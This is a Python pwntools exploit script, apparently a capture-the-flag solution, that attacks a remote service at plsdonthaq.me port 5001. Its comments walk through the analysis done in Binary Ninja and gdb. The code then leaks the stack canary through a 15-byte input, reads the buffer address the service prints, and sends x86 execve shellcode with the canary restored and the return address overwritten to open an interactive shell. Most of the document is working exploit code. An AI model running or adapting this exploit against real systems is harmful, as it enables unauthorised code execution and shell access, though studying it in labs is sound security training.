#!/usr/bin/env python3
from pwn import *

# Before creating the script:

# When looking in the binary ninja, we can see it calls fread to read in 0x10 (or 16)
# elements of size 1 bytes from stdin into a buffer. This means that when the binary 
# allows us to input, it will take the first 16 bytes of input and place it into the 
# buffer. NOTE: gives EOF for 16, yet 15 is fine.

# Next, the program tells me to write my data to this same buffer, and it then
# calls 'gets' to write into this buffer.

# After this, it then checks the canary to ensure it hasn't been modified, and if it
# has it aborts. For example, if I enter a cyclic sequence of length 300 from within
# gdb, it prints that the canary contains value 'maaanaaa', which is at offset 48.
# Given this, we know our canary is at offset 48 from our buffer.

# Hence, we are going to want to leak the canary value from our first input. To do so,
# we notice that when we enter 15 bytes of input into the first input, the contents
# of this buffer is printed followed by some random value. However, if we overflow
# the second input, it shows the global canary that we overwrote has this same value.
# Hence, this value printed is the canary itself and we can simply extract it.

# Then, in the second input our payload should be shellcode to pop a shell, making
# sure to overwrite the canary with its value and the return address with the address
# that is printed by the program (being the address of this buffer we are writing
# into).

# In binary ninja, we know our buffer is at address var_48, meaning it is 0x48 (or 72 
# bytes) above the return address. Also, to double check our canary position, we know 
# its at address var_18, meaning it is 0x18 (or 24 bytes) above the return address,
# meaning it is 72 - 24 = 48 bytes after the start of the buffer.

# The script:

p = remote("plsdonthaq.me", 5001)

# We first input 15 bytes from the 'fread' call.
p.sendline(b"A" * 15)

# Since the canary value is then printed, we want to extract this.
p.recvuntil("A\n")
canary = p.recv(8)

# Next, the program gives us the address of our buffer, so we also extract this.
p.recvuntil("buffer[")
buffer = int(p.recvuntil("]")[:-1], 0)

# Here we have the shellcode to place at the start of our buffer, which simply pops a
# shell.
shellcode = asm("""
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
mov ecx, eax
mov edx, eax
mov al, SYS_execve
int 0x80
""")

# Finally we send our payload as input for the 'gets' call, which consists of the
# shellcode constructed above, followed by the canary value at offset 48, and finally
# the address of our buffer at offset 72 such that we jump back to the start of our
# payload and execute the shellcode.
p.sendline(flat({
  0: shellcode,
  48: canary,
  72: p32(buffer)
}))

p.interactive()